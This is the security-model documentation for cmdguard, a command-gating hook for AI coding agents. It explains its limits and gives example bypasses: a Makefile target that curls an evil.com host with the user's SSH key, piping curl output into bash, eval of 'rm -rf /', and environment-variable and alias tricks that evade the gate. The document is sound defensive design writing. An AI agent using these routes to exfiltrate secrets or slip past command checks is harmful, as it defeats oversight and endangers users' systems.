# Security Model

## Gate, Not Sandbox

cmdguard is a **command gate**: it evaluates commands as they are invoked and decides whether to allow, deny, or prompt the user. It does not sandbox execution, intercept syscalls, or restrict file system access.

The purpose is to **remove excessive permission prompts** while providing guardrails for AI coding agents. When an agent runs `git status`, there is no reason to interrupt the user. When it runs `rm -rf /`, there is every reason to block it. cmdguard sits between those extremes, letting you express policy as code.

This is a practical tradeoff. A full sandbox (seccomp, containers, VMs) provides stronger isolation but adds complexity, latency, and compatibility issues. cmdguard aims for the 90% case: catching accidental damage and obvious mistakes from AI agents that are generally trying to be helpful.

## What cmdguard Does

- Parses compound commands (`&&`, `||`, `;`, `|`) and evaluates each segment
- Derives a conservative effective working directory for each segment and
  resolves relative path and redirection targets against it
- Unwraps wrappers (`sudo`, `nix develop --command`, `docker run`, env vars) to find the real command
- Resolves binary paths and classifies them into trust zones
- Parses flags and positional arguments using command schemas
- Evaluates Rego policies against the parsed command structure
- Resolves allow, deny, ask, or defer based on priority-weighted rule matching
- Renders that decision through the selected Claude Code or Codex hook protocol

## What cmdguard Does Not Do

cmdguard evaluates the **command string as invoked**. It cannot see or control what happens after execution begins. This creates several known limitations.

### Build File Poisoning

If an agent can edit `Makefile`, `package.json`, `pyproject.toml`, `Cargo.toml`, or any build configuration, it can make an allowed command do anything. For example:

- `make test` is allowed by policy
- The agent edits `Makefile` to add `test: ; curl http://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)`
- `make test` now exfiltrates secrets

This applies to any command that reads instructions from a file: npm scripts, cargo build scripts, pytest conftest, and so on.

**Mitigation:** Use file-level permissions in your agent to restrict edits to build files. Review diffs before accepting changes to build configuration.

### Alias and Function Shadowing

Shell aliases and functions resolve **before** cmdguard sees the command. If your shell defines:

```bash
alias ls='rm -rf /'
```

Then `ls` reaches cmdguard as `ls`, not as `rm -rf /`. cmdguard has no way to know about the alias.

**Mitigation:** This is primarily a concern if the agent can edit shell configuration files (`.bashrc`, `.zshrc`). Restrict edits to dotfiles.

### Pipe Indirection

Each segment of a pipeline is evaluated independently, but stdin content is opaque:

```bash
cat malicious.sh | bash
```

cmdguard sees two commands: `cat malicious.sh` (likely allowed) and `bash` (with no arguments, will be evaluated on its own). It cannot inspect what flows through the pipe.

Similarly, process substitution and heredocs pass content that cmdguard cannot evaluate:

```bash
bash <(curl http://evil.com/script.sh)
bash <<< "dangerous command"
```

**Mitigation:** Consider denying bare `bash` and `sh` invocations, or setting them to `ask`. The base policies do not allow shell interpreters without arguments by default.

### Environment Variable Manipulation

cmdguard strips inline environment variables (e.g., `RUST_LOG=debug cargo build` evaluates as `cargo build`), but the command still executes with those variables set. An agent could use environment variables to alter program behavior:

```bash
GIT_SSH_COMMAND="evil-script" git push
```

cmdguard sees `git push` and evaluates it normally. The base policy prompts for `git push`, but the environment variable can still change git's behavior in ways the policy cannot inspect.

**Mitigation:** This is a low-probability vector for most AI agent use cases. For high-security environments, consider sandboxing that restricts environment inheritance.

### Working Directory Analysis

cmdguard models literal absolute `cd` commands across common shell control
flow. It keeps subshell and background directory changes isolated, propagates
brace-group changes, and preserves multiple possible directories after
fallible sequential changes. Relative `cd`, expansions, `pushd`/`popd`, shell
state mutation, and cwd-changing pipelines produce an unknown state rather
than an optimistic path.

The derived cwd is also used for relative executables, relative `PATH` entries,
positional path arguments, and redirection targets. Shell-expanded positional
paths and process substitutions are not treated as known project paths;
process substitutions require confirmation because nested commands remain
opaque.

Resolved paths are nominal lexical paths, not filesystem capabilities. Symlink
changes and time-of-check/time-of-use races remain possible after evaluation.
Use a container, VM, jail, chroot, or another execution sandbox when a hard
filesystem boundary is required.

### Dynamic Shell Evaluation

Commands can spawn subshells in ways that are hard to statically analyze:

```bash
$(echo "rm -rf /")
eval "rm -rf /"
```

Command substitution inside arguments and `eval` constructs are not recursively evaluated. cmdguard sees the outer command but not what it dynamically generates. Structural subshells are recognized for cwd propagation, but their dynamically generated content remains opaque.

**Mitigation:** Deny or ask for `eval` and be cautious with commands that accept shell expressions as arguments.

## Complements, Does Not Replace

cmdguard is one layer in a defense-in-depth approach. It works best alongside:

- **Sandboxing** (containers, VMs, seccomp profiles) for hard isolation boundaries
- **File-level permissions** in the agent configuration to restrict which files can be edited
- **Code review** of agent-generated changes before merging
- **Agent-level safety** features built into the AI system itself
- **Network controls** to restrict outbound access from development environments

No single layer is sufficient. cmdguard reduces friction for the common case while providing meaningful guardrails. It is not a security boundary against a determined adversary with full shell access.

## Claude Code Auto Mode

cmdguard integrates with Claude Code as a Bash `PreToolUse` hook. It makes
policy decisions from the command string and returns `allow`, `deny`, or
`ask` before the Bash tool runs. Claude Code auto mode is a separate
classifier layer that evaluates higher-level risk from the session
context.

Those layers are complementary, not interchangeable. A cmdguard `deny`
blocks before auto mode classifier denial telemetry is emitted. A
cmdguard `ask` prompts the user. A cmdguard `allow` should not be treated
as proof that auto mode considers the action safe. `PermissionDenied`
hooks are useful for logging auto-mode classifier denials, but they do
not reverse a denial.

For commands no policy matches, cmdguard now returns a **defer** decision:
it emits no output and exits 0, so Claude Code's normal permission flow —
including the auto-mode classifier — decides. Previously this fallthrough
forced a prompt, short-circuiting the classifier. A cmdguard `deny` or
`ask` is unchanged: deny blocks, ask prompts. Set `defer_mode = "prompt"`
to make unmatched commands prompt again (a backstop for multi-hook setups).
Commands cmdguard cannot parse remain `ask`, not defer.

The base policy stays conservative for cases where the shell command
does not include enough context. For example, `git push` prompts because
the command string alone does not prove whether the push targets a
non-default working branch or a default branch such as `main` or
`master`.

## Codex Hooks, Approvals, and Sandbox

The Codex integration installs two Bash hooks in `~/.codex/hooks.json`:

- `PreToolUse` evaluates every supported Bash call cmdguard receives. A policy
  `deny` blocks the call. `allow`, `ask`, and `defer` emit no decision here.
- `PermissionRequest` runs only when Codex is already about to ask for
  approval. A policy `deny` rejects the request; `allow`, `ask`, and `defer`
  all leave the normal prompt unchanged. cmdguard can only refuse an
  approval request on `PermissionRequest` — it never grants one, even when
  policy says `allow`.
- Adapter and policy-loading failures use Codex's blocking hook exit path
  rather than silently allowing the tool call to continue.

This division matters because Codex does not currently support
`permissionDecision: "ask"` from `PreToolUse`. A cmdguard `ask` therefore
cannot force Codex to prompt for a command that its sandbox and approval policy
would otherwise run. It means "do not pre-approve this request; preserve the
Codex approval path if there is one." `defer_mode = "prompt"` has the same
limitation under Codex.

Codex's sandbox remains the technical execution boundary. cmdguard hooks do
not grant filesystem or network access: on `PreToolUse` an `allow` decision
is silent fallthrough, not an escalation, and on `PermissionRequest` cmdguard
can only deny, never approve, so Codex's own approval decision always stands.
Hooks operate at Codex lifecycle boundaries, not as a syscall boundary, so use
the Codex sandbox and managed permission configuration for hard constraints.

## Threat Model Summary

| Threat | cmdguard helps? | Notes |
|--------|----------------|-------|
| Agent runs `rm -rf /` | Yes | Denied by default |
| Agent runs `git push --force` | Yes | Prompts by default |
| Agent runs `git push origin main` | Yes | Prompts by default |
| Agent installs unknown packages | Partially | `npm install`, `pip install` trigger ask |
| Agent runs a command no rule matches | Defers | cmdguard stays silent; the agent's normal permission flow decides (configurable via `defer_mode`, subject to the Codex `ask` limitation) |
| Agent edits Makefile, then runs `make` | No | Build file content is opaque |
| Agent exfiltrates data via curl | Partially | curl triggers ask, but can be bypassed via pipes |
| Agent modifies shell config | No | Requires file-level permissions |
| Agent uses eval/subshell tricks | No | Dynamic command generation is opaque |
| Malicious project `.cmdguard/` rules | Partially | Project rules have lower default priority than global |

## Design Decisions

**Why Rego?** Rego (via the [regorus](https://github.com/nickel-lang/regorus) engine) provides a declarative policy language that is well-suited to allow/deny decisions. It is fast, deterministic, and composable.

**Why not a simple allow-list?** Simple allow-lists cannot express conditions like "allow git push but not with --force" or "allow rm only for files inside the project". Rego lets users write policies as precise or as broad as they want.

**Why priority-based resolution?** Multiple policies may match the same command. Priority ensures that a deny rule always beats an allow rule, and that users can override base policies without editing them.

**Why base + user separation?** Base policies ship with cmdguard and are updated on `cmdguard base sync`. User policies in `policies/` are never overwritten. This lets users customize without merge conflicts.
